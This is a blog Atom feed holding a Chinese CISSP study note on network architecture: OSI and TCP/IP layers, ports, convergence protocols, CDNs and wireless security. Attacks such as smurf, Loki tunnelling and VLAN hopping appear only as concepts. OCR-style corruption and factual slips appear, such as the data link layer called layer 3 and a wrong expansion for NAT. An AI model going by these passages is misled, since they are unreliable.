<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>doubiduo</title>
  
  <subtitle>diyz.bid</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.diyz.bid/"/>
  <updated>2018-10-11T10:12:52.898Z</updated>
  <id>https://www.diyz.bid/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>cissp学习笔记（11）——网络安全架构与保护网络组件</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8811%EF%BC%89%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E4%BF%9D%E6%8A%A4%E7%BD%91%E7%BB%9C%E7%BB%84%E4%BB%B6/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/</id>
    <published>2018-10-09T05:51:50.000Z</published>
    <updated>2018-10-11T10:12:52.898Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>4) 通信与网络安全(设计和保护网络安全)</p><ul><li>A. 应用安全设计原则到网络架构中(例如， IP和非IP协议、分段)<br>-A.1 0SI和TCP/IP模型<br>-A.2 IP网络<br>-A.3 应用多层协议(例如， DNP3)<br>-A.4 汇聚协议(例如， FCoE、MPLS、VoIP、iSCSI)<br>-A.5 软件定义网络<br>-A.6 无线网络<br>-A.7 使用密码学维护通信安全</li><li>B. 保护网络组件<br>-B.1 硬件的操作(例如， 调制解调器、交换机、路由器、无线接入点、移动设备)<br>-B.2 传输介质(例如， 有线、无线、光纤)<br>-B.3 网络接入控制设备(例如， 防火墙、代理)<br>-B.4 终端安全<br>-B.5 内容分发网络<br>-B.6 物理设备</li></ul><h3 id="11-1-OSI模型"><a href="#11-1-OSI模型" class="headerlink" title="11.1 OSI模型"></a>11.1 OSI模型</h3><h4 id="11-1-1-OSI模型的历史"><a href="#11-1-1-OSI模型的历史" class="headerlink" title="11.1.1 OSI模型的历史"></a>11.1.1 OSI模型的历史</h4><p>　　OSI协议的开发为所有计算机系统建立了一个通用的通信结构或标准。实际的OSI协议从来没有得到过广泛采用， 但是OSI协议背后的理论， 也就是OSI模型， 却被大家很容易接受了。作为一个抽象的架构或理论模型， OSI模型说明了在理想硬件上的理想环境中协议应该怎样工作。因此， OSI模型已经成为一个所有协议都可以与其比较和对照的通用参考点。</p><h4 id="11-1-2-OSI功能"><a href="#11-1-2-OSI功能" class="headerlink" title="11.1.2 OSI功能"></a>11.1.2 OSI功能</h4><p>　　OSI模型把网络任务划分到7个不同的层中。这些层用来具体表明信息流如何通过不同的通信层面。每一层都与上面的层和下面的层进行直接通信， 加上其他对等的层而形成通信伙伴系统。<br><img src="/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/OSI模型.png"><br>　　OSI模型的真正优点在于它对网络互连实际工作方式的描述。在最基本的概念中， 网络通信出现在物理连接中(无诡物理连接是铜钱上的电子、光纤中的光子还是空气中的无线电信号)。物理设备建立了信道， 电子信号能够通过信道从一台计算机传递至另一台计算机。这些物理设备信道只是OSI模型定义的7种逻辑通信类型中的一种。OSI模型的每一层都通过一个逻辑信道与另一台计算机上的对等层进行通信。这样一来， 通过识别远程通信实体以及验证接收数据的来源， 基于OSI模型的协议就能够支持某种身份认证类型。</p><h4 id="11-1-3-封装-解封装"><a href="#11-1-3-封装-解封装" class="headerlink" title="11.1.3 封装/解封装"></a>11.1.3 封装/解封装</h4><p>　　基于OSI模型的协议采用了一种被称为封装的机制。通过每一层从上一层接收到数据后， 封装会给数据添加一个报头， 井且还可能添加一个报尾， 然后才将数据传输到下一层。随着报文在每一层的封装， 报文的大小也在不断增长。数据从OSI模型的应用层向下移动至物理层时， 在每一层都会发生封装。数据从OSI模型的物理层向上移动至应用层时， 在每一层发生的逆向操作称为解封装。封装/解封装过程如下所示：</p><ul><li>应用层创建报文。</li><li>应用层将报文传递至表示层。</li><li>表示层通过向报文添加信息对它进行封装。信息通常只被添加到报文的开始部分(称为报头);不过， 某些层也会在报文的结尾部分添加内容(称为报尾) ， 如下图所示。</li></ul><img src="/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/OSI模型的封装示例.png"><ul><li>向下传递报文并且部加每层指定信息的过程将一直持续， 直到报文到达物理层。</li><li>在物理层， 报文被转换为表示比特的电子脉冲， 并且通过物理连接进行传输。</li><li>处于接收状态的计算机从物理连接中截获这些比特， 并且在物理层重新创建报文。</li><li>物理层将报文从比特转换为数据链路帧， 并且将报文向上发送至数据链路层。</li><li>数据链路层剥离信息， 并且将报文向上发送至网络层。</li><li>解封装的过程一直持续， 直到报文到达应用层。</li><li>当报文到达应用层时， 报文中的数据被发送至预期的软件接收者。</li></ul><p>　　发送至应用层(第7层)上协议找中的报文被称为数据流。直至到达传输层(第4层)， 报文仍然保持着数据流的标签， 报文在传输层被称为段(使用TCP协议时的称呼)或数据报(使用UDP协议时的称呼)。在网络层(第3层)， 报文被称为数据包。在数据链路层(第3层)， 报文被称为l帧。在物理层(第l层)， 数据己经被转换为能够通过物理连接介质传输的比特。如下图：<br><img src="/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/OSI模型的数据名称.png"></p><h4 id="11-1-4-OSI分层"><a href="#11-1-4-OSI分层" class="headerlink" title="11.1.4 OSI分层"></a>11.1.4 OSI分层</h4><h5 id="1-物理层"><a href="#1-物理层" class="headerlink" title="1. 物理层"></a>1. 物理层</h5><p>　　物理层(第1层)从数据链路层接收帧， 并把帧转换为可以通过物理连接介质传送的比特。物理层还负责接收来自物理连接介质的比特， 并且将比特转换为数据链路层所使用的帧。物理层包含了会告诉协议如何应用硬件来发送和接收比特的多种设备驱动l􁻢}芋。物理层还涉及电气规范、协议和接口标准， 如下所示:</p><ul><li>EIAlTIA-232和EWTIA-449</li><li>X.21</li><li>高速串行接口(High-Speed Serial Interface， HSSI)</li><li>同步光网络(Synchronous Optical Network， SONET)</li><li>V.24和V.35</li></ul><p>　　通过设备驱动程序和这些标准， 物理层控制吞吐率、处理同步、管理线路噪音和介质访问， 并且决定使用数字、模拟或光脉冲信号在物理硬件接口上传输和接收数据。工作在物理层上的网络硬件设备包括网络接口卡(NIC)、集线器、中继器、集中器和放大器。这些设备执行基于硬件的信号操作。</p><h5 id="2-数据链路层"><a href="#2-数据链路层" class="headerlink" title="2. 数据链路层"></a>2. 数据链路层</h5><p>　　数据链路层(第2层)负责将来自网络层的数据包格式化为可以进行传输的适当格式。数据链路层内保留了一些技术特有的协议， 这些协议将数据包转换为适当格式的数据帧。一旦数据帧完成了格式化， 就会被发送至物理层进行传输。下面列出了数据链路层内驻留的协议:</p><ul><li>串行线路网络协议(SLIP)</li><li>点对点协议(PPP)</li><li>地址解析协议(ARP)</li><li>反向地址解析协议(RARP)</li><li>二层转发协议(L2F)</li><li>二层隧道协议(L2TP)</li><li>点对点隧道协议(PPTP)</li><li>综合服务数字网络(ISDN)</li></ul><p>　　在数据链路层上对数据执行的部分处理过程包括向数据帧添加硬件的源地址和目的地址。硬件地址指的是介质访问控制(MAC)地址， 它是一种用十六进制表示法表示的6字节(48比特)二进制地址(例如， 00-13-02-1F-58-F5)。地址的前三个字节(24比特)指示了物理网络接口的供应商或制造商。这被称为组织唯一标识符(Organizationally Unique Identifier， OUI)。 OUI由IEEE进行注册并控制发行。后三个字节(24位)代表一个独特的数字并被分配给该接口的制造商。没有两个设备可以在同一个本地以太网广播域中具有相同的” 同一个” 地址: 否则会发生地址冲突。<br>　　地址解析协议(ARP)和反向地址解析协议(RARP)。使用ARP将IP地址解析为MAC地址。使用MAC地址能够将某个网段(例如， 通过集线器的线路)上的通信数据从源系统定向至目标系统。使用RARP将MAC地址解析为IP地址。数据链路层包含两个子层: 逻辑链路控制(Logical Link Control， LLC)子层和MAC子层。工作在第2层(数据链路层)的网络硬件设备包括交换机和桥。</p><h5 id="3-网络层"><a href="#3-网络层" class="headerlink" title="3. 网络层"></a>3. 网络层</h5><p>　　网络层(第3层)负责向数据中添加路由和寻址信息。网络层接收来自于传输层的数据段， 并且通过添加信息创建数据包。数据包包括源IP 地址和目的IP地址。路由协议位于这一层， 包括下列协议:</p><ul><li>网络控制报文协议(Internet Control Message Protocol，ICMP)</li><li>路由信息协议(Routing Information Protocol，RIP)</li><li>开放式最短路径优先(Open Shortest Path First， OSPF)</li><li>边界网关协议(Border Gateway Protocol， BGP)</li><li>网络组管理协议(Internet Group Management Protocol， IGMP)</li><li>网际协议(IP)</li><li>网际协议安全(IPSec)</li><li>互联网分组交换协议(Internetwork Packet Exchange， IPX)</li><li>网络地址转换(Simple Key Management for Internet Protocol， NAT)</li><li>网络简单密钥管理协议(SKIP)</li></ul><p>　　网络层负责提供路由或传送信息， 但是不负责保证传输己进行验证(这个工作由传输层负责)。网络层还管理着错误检测和节点数据通信(也就是通信控制)。工作在第三层的网络层硬件设备包括路由器和桥式路由器。</p><h5 id="4-传输层"><a href="#4-传输层" class="headerlink" title="4. 传输层"></a>4. 传输层</h5><p>　　传输层(第4层)负责管理连接的完整性并控制会话。传输层接收来自于会话层的PDU(又名协议数据单元、数据包单元或数据负荷单元， 是一个在网络层流经的包含信息和数据的容器)并将其转换为数据段。传输层控制网络上设备的寻址或引用方式， 以及在节点(也被称为设备)之间建立通信连接， 还有定义会话的规则。会话规则指定每个数据段中可以包含多少数据、如何验证传输数据的完整性、如何确定数据是否丢失。会话规则在握手过程中建立。<br>　　传输层在两台设备之间建立了一个逻辑连接， 并且提供了能够确保数据传递的端到端传输服务。这一层包括针对分段、排序、错误检查、数据流控制、错误纠正、复用和网络服务优化的机制。下面列出了一些在传输层上运作的协议:</p><ul><li>传输控制协议(TCP)</li><li>用户数据报协议(UDP)</li><li>顺序数据包交换(SPX)</li><li>安全套接宇层(SSL)</li><li>传输层安全(TLS)</li></ul><h5 id="5-会话层"><a href="#5-会话层" class="headerlink" title="5. 会话层"></a>5. 会话层</h5><p>　　会话层(第5 层)负责在两台计算机之间建立、维护和终止通信会话。这一层管理对话模式或对话控制(单工、半双工、全双工)， 并为分组和恢复建立检查点， 以及重新传输上一次验证检查点以来失败或丢失的PDU。下面列出了一些在会话层上运行的协议:</p><ul><li>网络文件系统例FS)</li><li>结构化查询语言(SQL)</li><li>远程过程调用(RPC)</li></ul><p>　　通信会话能够以下列三种不同模式中的一种模式进行操作:</p><ul><li>单工单向直接通信</li><li>半双工双向通信， 但是每次只有一个方向可以发送数据</li><li>全双工双向通信， 此时数据可以同时在两个方向上进行传输</li></ul><h5 id="6-表示层"><a href="#6-表示层" class="headerlink" title="6. 表示层"></a>6. 表示层</h5><p>　　表示层(第6层)负责将从应用层接收的数据转换为遵从OSI模型的任何系统都能理解的格式。它向数据中强行添加通用的或标准的结构和格式化规则。表示层还负责加密和压缩。因此， 它成为网络和应用程序之间的接口。通过确保数据格式能够被两个系统支持， 表示层准许不同的应用程序通过网络交互。大多数文件或数据格式在这一层上出现， 包括图像、视频、音频、文档、电子邮件、Web页面和控制会话等格式。下面列出了表示层内存在的一些格式标准:</p><ul><li>美国信息交换标准代码(ASCII)</li><li>扩充二进制编码的十进制交换码(EBCDIC)</li><li>标签图像文件格式(TIFF)</li><li>联合图像专家组(JPEG)</li><li>运动图像专家组(MPEG)</li><li>音乐设备数字接口(MIDI)</li></ul><h5 id="7-应用层"><a href="#7-应用层" class="headerlink" title="7. 应用层"></a>7. 应用层</h5><p>　　应用层(第7层)负责将协议枝与用户的应用程序、网络服务或操作系统连接在一起。它准许应用程序与协议技进行通信。应用层确定远程的通信方是否可用和可访问， 还确保有足够的资源用于支持被请求的通信。应用程序并不位于应用层内; 相反， 传输文件、交换信息和连接远程终端等任务所需的协议和服务都在这一层。很多应用专用的协议也在应用层内， 例如下面这些协议:</p><ul><li>超文本传输协议(HTTP)</li><li>文件传输协议(FTP)</li><li>行式打印机后台程序(LPD)</li><li>简单邮件传输协议(SMTP)</li><li>远程登录(Telnet)</li><li>普通文件传输协议(TFTP)</li><li>电子数据交换(EDI)</li><li>邮局协议第三版(POP3)</li><li>互联网消息访问协议(IMAP)</li><li>简单网络管理协议(SNMP)</li><li>网络新闻传输协议例NTP)</li><li>安全远程过程调用(S-RPC)</li><li>安全电子交易(SET)</li></ul><p>　　有一种网络设备(或服务)工作在应用层， 名叫网关。但是， 应用层网关是一种特定类型的组件。网关作为协议转换工具使用。应用防火墙也工作在这一层。其他网络设备或过滤软件也可以在这一层监测或修改数据流。</p><h3 id="11-2-TCP-IP模型"><a href="#11-2-TCP-IP模型" class="headerlink" title="11.2 TCP/IP模型"></a>11.2 TCP/IP模型</h3><p>　　TCP/IP模型(也称为DARPA或DOD模型)仅由4层组成。TCP/IP模型的4层为:应用层、传输层(也称为主机到主机层)、网际层(有时称为互联网层)和网络接入层(然而网络接口层和网络访问层都会被用到)。<br></p><h4 id="11-2-1-TCP-IP协议族概述"><a href="#11-2-1-TCP-IP协议族概述" class="headerlink" title="11.2.1 TCP/IP协议族概述"></a>11.2.1 TCP/IP协议族概述</h4><p>　　TCP/IP是使用最广泛的协议， 但它并不是一个单独的协议， 而是一个由许多单独的协议组成的协议枝(如下图所示)。<br><img src="/notes/cissp学习笔记（11）——网络安全架构与保护网络组件/TCPIP模型的4个层次及其组成协议.png"></p><p>　　TCP/IP是一个基于开放式标准的、独立于平台的协议。然而， 这既是它的优点， 也是它的缺点。TCP/IP几乎可以在所有可用的操作系统中找到， 但是它耗用了相当数量的资源， 并且由于其设计目的是便于使用而不是安全， 因此容易遭到攻击。TCP/IP可以使用两个系统之间的VPN 链接进行安全保护。VPN链接通过加密增加了隐私性、机密性和身份认证， 并且维护数据的完整性。用于建立VPN的协议包括点对点隧道协议(PPTP)、二层隧道协议(L2TP)和网际协议安全(IPSec)。另一种提供协议级别安全性的方法是采用TCP 包装。通过在用户ID或系统ID的基础上限制对端口和资源的访问， TCP包装可以作为能够起到基本防火墙作用的应用程序。TCP包装是基于端口的访问控制形式。</p><h5 id="1-传输层协议"><a href="#1-传输层协议" class="headerlink" title="1. 传输层协议"></a>1. 传输层协议</h5><p>　　TCP/IP 两个主要的传输层协议是TCP和UDP。TCP是一个面向连接的协议， 而UDP是一个无连接的协议。当一个通信连接在两个系统之间建立起来时， 它通过端口的使用完成操作。TCP和UDP都有65536个端口。因为端口号是16位二进制数， 所以端口总数为2^16或65536，并且从0到65535进行编号。端口(也被称为套接宇)就是通信链接两端在传输数据时同意使用的地址号。这些端口中的前1024个(端口0-1023)被称为知名端口或服务端口， 这是由于它们己经按照标准分配给所支持的服务。端口1024-49151被称为己注册软件端口。这些端口具有注册到IANA的一个或多个互联软件产品， 目的是为试图连接其产品的客户端提供一个标准的端口编号系统。因为通常被客户端随机使用为源端口， 所以端口49152-65535被称为随机端口。在客户端和服务器之间协商初始服务或己注册端口之外的数据传输营造时， 某些网络连接服务也会使用这些随机端口。与UDP 协议相比， TCP 报头相对复杂。TCP 报头的长度为20 到60 字节， 这个报头被分为若干部分或宇段，如下：</p><table><thead><tr><th>比特数字</th><th>字段</th></tr></thead><tbody><tr><td>16</td><td>源端口</td></tr><tr><td>16</td><td>目的端口</td></tr><tr><td>32</td><td>序列号</td></tr><tr><td>4</td><td>数据偏移量</td></tr><tr><td>4</td><td>预留使用</td></tr><tr><td>8</td><td>标志</td></tr><tr><td>16</td><td>窗口大小</td></tr><tr><td>16</td><td>校验和</td></tr><tr><td>16</td><td>紧急指针</td></tr><tr><td>可变</td><td>各种选项; 大小必须是32 比特的倍数</td></tr></tbody></table><p>　　标志宇段可以包含对一个或多个标志或控制位的指示项。这些标志指示TCP数据包的功能， 并且请求接收方采用特定的方式进行响应。标志宇段的长度为8比特， 其中每个比特位置都表示单个标志或控制设置， 使用值1 可以设置打开， 使用值0则可以设置关闭。有些情况下， 可以一次性启用多个标志(也就是同时设置SYN和ACK标志时TCP三步握手中的第二个数据包)。标志控制比特如下：</p><table><thead><tr><th>标志比特指示项</th><th>各字</th><th>描述</th></tr></thead><tbody><tr><td>CWR</td><td>拥塞窗口大小</td><td>用于管理拥塞链接上的传输</td></tr><tr><td>ECE</td><td>ECN-Echo(明确拥塞通知)</td><td>用于管理拥塞链接上的传输</td></tr><tr><td>URG</td><td>紧急</td><td>指示紧急数据</td></tr><tr><td>ACK</td><td>确认</td><td>确认同步或关闭请求</td></tr><tr><td>PSH</td><td>推送</td><td>指示需要立即推送数据加以应用</td></tr><tr><td>RST</td><td>重置</td><td>导致TCP 会话立即断开连接</td></tr><tr><td>SYN</td><td>同步</td><td>请求使用新的序列号进行同步</td></tr><tr><td>FlN</td><td>结束</td><td>请求对TCP 会话的正常关闭</td></tr></tbody></table><p>　　在IP报头协议字段中， 表示TCP的值为6(0x06)。协议宇段值是在每个IP数据包中都能找到的标签或标志， 它告知接收系统所接收数据包的类型。E 报头的协议字段指示下一个封装协议的标识， 也就是来自当前协议层的载荷包含的协议(例如， ICMP或IGMP)或上一层的协议(例如， TCP或UDP)。<br>　　用户数据报协议(UDP)也在OSI模型的第4层(传输层)上运作， 它是一种无连接的、”尽力而为的”通信协议。UDP不提供错误检测或纠正， 不使用序列， 不使用流量控制机制， 不使用预先建立的会话， 并且被认为是不可靠的。UDP具有极低的系统开销， 因此能够快速传输数据。UDP报头的长度为8个字节(64位)。UDP头被分为4个部分或字段(每个16位长):</p><ul><li>源端口</li><li>目的端口</li><li>报文长度</li><li>校验和</li></ul><h5 id="2-网络层协议和IP网络基础"><a href="#2-网络层协议和IP网络基础" class="headerlink" title="2. 网络层协议和IP网络基础"></a>2. 网络层协议和IP网络基础</h5><ul><li><strong>IP等级</strong> 完整的A类子网可以支持16777214台主机， 完整的B类子网可以支持65534台主机， 而完整的C类子网则可以支持254台主机。D类子网被用于多擂， E类子网被保留给将来使用。子网划分的另一个选项是使用无类域间路由选择(Classless Inter-Domain Routing， CIDR)。CIDR没有使用采用完整点分十进制表示法的子网掩码， 而是使用掩码位。因此， CIDR通过斜线被添加在IP地址之后， 例如， 使用172.16.1.1/16代替255.255.0.0。与传统的子网掩码技术相比， CIDR 的一个重要优点是能够将多个不相邻的地址集组合在单个子网内。</li><li><strong>ICMP</strong> 网络控制报文协议(ICMP)用于确定某个网络或特定链接的健康状况。pmg、traceroute、pathping以及其他网络管理工具都利用了ICMP。ping实用程序利用了ICMP的回应(echo)命令数据包， 并且使用它们对远程系统进行试探。ICMP的功能往往被各种基于带宽的拒绝服务攻击所利用， 例如， ping of death攻击、smurf攻击和pmg洪泛攻击。ping of death攻击发送一个畸形的大于65535字节(大于最大IPv4数据包大小)的数据包给一台计算机并试图让其崩溃。smurf攻击通过欺骗广播ping对目标网络产生巨大的流量， pmg数据包泛洪攻击是一个基本的拒绝服务(DoS)攻击， 它消耗目标可用的所有带宽。</li><li><strong>IGMP</strong> 网络组管理协议(IGMP)允许系统支持多播。多播是将数据传输给多个特定的接收者。IP主机使用IGMP注册其动态的多播组成员。己连接的路由器也使用IGMP 来发现这些组。通过使用IGMP多播操作， 服务器在一开始就可以只传输单个数据信号， 从而不必为每个预定的接收者分别传输数据信号。借助于IGMP， 如果数据到达预定接收者的路径有分叉， 那么最初的单个信号就会在路由器处被复用。IP报头协议宇段中表示IGMP的值为2(Ox02) 。</li><li><strong>ARP与反向ARP</strong> 对于逻辑和物理寻址模式的互操作性来说， 地址解析协议僻的与反向地址解析协议(RARP)是必不可少的。ARP 用于将IP地址(用于逻辑寻址的32位二进制数)解析为介质访问控制(MAC)地址(用于物理寻址的48位二进制数)–或者EUI-48–甚至EUI-64。通过使用MAC地址， 某个网段上(例如， 通过一个集线器的线缆)的通信从源系统定向至目的系统。RARP用于将MAC地址解析为IP地址。</li></ul><h5 id="3-常见的应用层协议"><a href="#3-常见的应用层协议" class="headerlink" title="3. 常见的应用层协议"></a>3. 常见的应用层协议</h5><ul><li><strong>远程登录(Telnet)， TCP端口23</strong> 这是一个终端仿真网络应用， 支持能够执行命令和运行应用程序的远程连通性， 但是不支持文件传输。</li><li><strong>文件传输协议(FTP)， TCP端口20和21</strong> 这是一个支持文件交换的网络应用， 文件交换要求进行匿名的或特定的身份认证。</li><li><strong>普通文件传输协议(TFTP)， UDP端口69</strong> 这是一个支持文件交换的网络应用， 文件交换不要求进行身份认证。</li><li><strong>简单邮件传输协议(SMTP)， TCP端口25</strong> 这个协议用于从客户端向邮件服务器以及从一个邮件服务器向另一个邮件服务器传送邮件。</li><li><strong>邮局协议(POP3)， TCP端口110</strong> 这个协议用于将邮件服务器收件箱中的邮件传送至邮件客户端。</li><li><strong>互联网消息访问协议(IMAP)， TCP端口143</strong> 这个协议用于将邮件服务器收件箱中的邮件传输至邮件客户端。IMAP 比POP3 更安全， 并且能够从邮件服务器中取出邮件头， 在不必先下载至本地客户端的情况下就可以直接从邮件服务器中删除邮件。</li><li><strong>动态主机配置协议(DHCP)， UDP 端口67 和68</strong> DHCP将端口67用于服务器点对点响应， 将端口68用于客户端请求广播。在系统启动时， DHCP用于为系统指派TCP/IP配置设置。DHCP提供了对网络寻址的集中化控制。</li><li><strong>超文本传输协议(HTTP)， TCP 端口80</strong> 这个协议用于从Web服务器向Web浏览器传送Web页面元素。</li><li><strong>安全套接宇层(SSL)， TCP 端口443</strong> 这是一个在会话层上运作的、像VPN一样的安全协议。SSL原本设计用于支持安全的Web 通信。ITTPS)， 不过它能够保护任何应用层协议通信的安全。</li><li><strong>行式打印后台程序(LPD)， TCP 端口515</strong> 这是一个用于管理打印作业以及向打印机发送打印作业的网络服务。</li><li><strong>X视窗(X Window) ， TCP 端口6000-6063</strong> 这是一个用于命令行操作系统的GUI API。</li><li><strong>引导协议(BootP)/动态主机配置协议(DHCP)， UDP端口67和68</strong> 这个协议用于通过自动分配IP配置以及下载基本的OS元素来连接无盘工作站和网络。BootP是DHCP的前身。</li><li><strong>网络文件系统(NFS)， TCP端口2049</strong> 这是一个用于支持在不同系统之间共享文件的网络服务。</li><li><strong>简单网络管理协议(SNMP)， UDP端口161(UDP端口162用于跟踪信息)</strong> 这个网络服务被用于通过从中央监控站轮询监控设备来收集网络健康和状况信息。</li></ul><h4 id="11-2-2-分层协议的应用"><a href="#11-2-2-分层协议的应用" class="headerlink" title="11.2.2 分层协议的应用"></a>11.2.2 分层协议的应用</h4><p>　　Web服务器和Web浏览器之间的通信工作在一个典型的网络连接上， HTTP封装在TCP中， TCP又封装在IP中， 而IP又封装在以太网中。这个封装可以用以下方式进行展示:<br><code>[ Ethernet [ IP [ TCP [ HTTP ] ] ] ]</code></p><p>　　添加SSL/TLS加密通信会使得HTTP和TCP之间插入一种新的封装:<br><code>[ Ethernet [ IP [ TCP [ SSL [ HTTP ] ] ] ] ]</code></p><p>　　同理， 又可以用诸如IPSec 的网络层加密进行进一步封装:<br><code>[ Ethernet [ IPSec [ IP [ TCP [ SSL [ HTTP ] ] ] ] ] ]</code></p><p>　　如果一个网络阻止FTP但允许HTTP， 那么利用诸如HTTP隧道的工具就可以用来绕过这个限制。这导致出现以下所示的封装结构:<br><code>[ Ethernet [ IP [ TCP [ HTTP [ FTP ] ] ] ]</code></p><p>　　通常情况下， HTTP带有与自己Web相关的载荷， 但通过HTTP隧道工具， 标准的有效载荷被另一个协议取代。这种错误封装甚至可以在较低的协议战中出现。例如， ICMP通常用于网络健康测试而不是一般通信。然而， 随着诸如Loki的出现， ICMP被转换为支持TCP通信的隧道协议。Loki的封装结构如下:<br><code>[ Ethernet [ IP [ ICMP [ TCP [ HTTP ] ] ] ] ]</code></p><p>　　另一个关注的领域是， 对无界封装的支持将带来在VLAN之间跳跃的能力。VLAN通过逻辑标签分离实现网络分段。这种被称为跳跃攻击的攻击通过创建二次封装æEE 802.1Q VLAN标签的方式来进行:<br><code>[ Ethernet [ VLAN1 [ VLAN2 [ IP [ TCP [ HTTP ] ] ] ] ] ]</code></p><p>　　通过这样的两次封装， 第一次遇到的交换机将剥离第一个VLAN标签， 接下来的交换机将被内部VLAN标签欺骗并将流量转移到其他VLAN中。<br>　　多层协议提供以下好处:</p><ul><li>可以在更高层使用更为广泛的协议</li><li>封装可以和不同的层进行合作</li><li>在更为复杂的网络中支持灵活性和弹性</li></ul><p>　　多层协议有以下几个缺点:</p><ul><li>允许隐蔽信道</li><li>过滤机制可被绕行</li><li>逻辑上实现的网络段边界可以被逾越</li></ul><h4 id="11-2-3-TCP-IP的脆弱性"><a href="#11-2-3-TCP-IP的脆弱性" class="headerlink" title="11.2.3 TCP/IP的脆弱性"></a>11.2.3 TCP/IP的脆弱性</h4><p>　　TCP/IP 的脆弱性有很多。在各种操作系统中， 不正确地实现TCP/IP堆栈很容易遭受缓冲区溢出攻击、SYN泛洪攻击、各种DoS攻击、碎片攻击、过长数据包攻击、欺骗攻击、中间人攻击、劫持攻击以及编码错误攻击。除了这些侵入式攻击以外， TCP/IP(以及大多数协议)还常常遭受通过监控或嗅探进行的被动式攻击。网络监控是对信息流量模式进行监控， 从而获得网络相关信息的行为。数据包嗅探是从网络中捕获数据包井期望从信息数据包内容中抽取出有用信息的行为。有效的数据包嗅探器可以抽取出用户名、密码、电子邮件地址、加密密钥、信用卡号、IP 地址和系统名等信息。</p><h4 id="11-2-4-域名解析"><a href="#11-2-4-域名解析" class="headerlink" title="11.2.4 域名解析"></a>11.2.4 域名解析</h4><p>　　寻址和命名操作是使网络通信成为可能的重要组成部分。理解在基于TCP/IP的网络中使用的寻址和命名的基本概念相当重要。</p><ul><li>第三层或底层， 是MAC地址层。MAC地址或硬件地址是”永久”的物理地址。</li><li>第二层或中间层， 是IP 地址层。IP地址是在MAC地址上”临时”赋予的逻辑地址。</li><li>最顶层是域名。域名或计算机名是在IP地址上”临时”赋予的友好转换约定。</li></ul><h4 id="11-3-汇聚协议"><a href="#11-3-汇聚协议" class="headerlink" title="11.3 汇聚协议"></a>11.3 汇聚协议</h4><ul><li><strong>以太网光纤通道(FCoE)</strong> 光纤通道是网络存储解决方案(存储区域网络(SAN)或网络附加存储(NAS))的一种形式，允许高达16Gbps的上行高速文件传输。设计目的是要在光纤线缆上运行， 之后支持在铜电缆上运行， 并提供更便直的选择。光纤通道通常需要自己专用的基础设施(单独的线缆)。然而， 以太网光纤通道(FCoE)可以用来支持在现有的网络基础设施上使用。FCoE用来在以太网网络上封装光纤通道通信， 通常需要10Gbps以太网以便支持光纤通道协议。通过这一技术， 光纤通道作为网络层或OSI第三层协议， 替换IP作为标准的以太网网络负载。</li><li><strong>MPLS(多协议标签交换)</strong> MPLS(多协议标签交换)是一种高通过、高性能的网络技术， 它将数据在网络中以基于最短路径的标签而不是更长的网络地址进行传输。这种技术节省了传统的基于IP的路由过程， 这个过程可能相当复杂。此外， 设计MPLS的目的是通过封装处理广泛的协议。这样，网络就不局限于TCP/IP和兼容的协议。MPLS支持许多其他网络技术的使用， 包括T1/E1、ATM、帧中继、SONET和DSL。</li><li><strong>互联网小型计算机系统接口(iSCSI)</strong> 互联网小型计算机系统接口(iSCSI)是一个基于IP的网络存储标准。这项技术可以用来支持位置独立的文件存储、传输， 以及对局域网、广域网的检索， 或者公共互联网连接。iSCSI通常被认为是光纤通道的一种低成本替代方案。</li><li><strong>IP语音(VoIP)</strong> IP语音(VoIP)是用于在TCP/IP网络上传输语音和/或数据的一种隧道机制。</li><li><strong>软件定义网络(SDN)</strong> 软件定义网络(SDN)是一种独特的对网络进行操作、设计和管理的方法。该概念基于这样一个理论， 即传统网络设备配置的复杂性(如路由器和交换机)经常强迫组织依附于某单一的设备厂商(如思科)， 这不仅限制了网络的灵活性， 而且难以应对不断变化的物理和商业条件。SDN 旨在把控制层(即网络服务的数据传输管理)和基础设施层(即硬件和基于硬件的设置)分离。此外， 它还移除了IP寻址、子网、路由以及诸如此类从需求到被固化程序编码或解释的传统网络概念。它允许数据传输路径、通信决策树以及流量控制在SDN控制层是虚拟化的， 而不是在每个设备的基础硬件上进行处理。</li></ul><h3 id="11-4-内容分发网络"><a href="#11-4-内容分发网络" class="headerlink" title="11.4 内容分发网络"></a>11.4 内容分发网络</h3><p>　　内容分发网络(CDN)或内容转发网络， 是资源服务的集合， 被部署在互联网的许多数据中心以提供低延迟、高性能和所承载内容的高可用性。CDN通过分布式数据主机提供客户所需的多媒体性能质量， 而不是将媒体内容存储在单一位置的单一主机上， 并向互联网的其他地方进行内容分发。这是一种地理和逻辑负载均衡的结果。在所有资源发起请求的负荷下， 没有哪个服务器或群集服务器会变得有压力， 且托管服务器变得更接近于发起请求的客户。总的结果是较低的延迟和更高质量的吞吐量。</p><h3 id="11-5-无线网络"><a href="#11-5-无线网络" class="headerlink" title="11.5 无线网络"></a>11.5 无线网络</h3><h4 id="11-5-1-保护无线接入点"><a href="#11-5-1-保护无线接入点" class="headerlink" title="11.5.1 保护无线接入点"></a>11.5.1 保护无线接入点</h4><p>　　无线覆盖单元是在物理环境中无线设备可以接入到无线接入点的区域。无线覆盖单元可导致环境中的安全泄露， 允许攻击者轻易连接到无线网络。应该调整无线接入点的强度， 以确保用户接入认证的最大化和攻击者接入的最小化。做这些工作需要单独的无线接入点的独特位置、外罩防护以及噪声屏蔽。<br>　　部署无线网络时， 应该部署无线接入点并使用基础设施模式而不是点对点模式。点对点模式意味着任意两个无线网络设备， 包括两个无线网络接口卡(NIC) ， 能在不需要中心控制认证的情况下进行通信。基础设施模式意味着需要一个无线接入点， 系统上的无线网卡之间不能互联。无线接入点的无线网络接入控制应该进行强化。<br>　　基础设施模式的概念有几个变化模式， 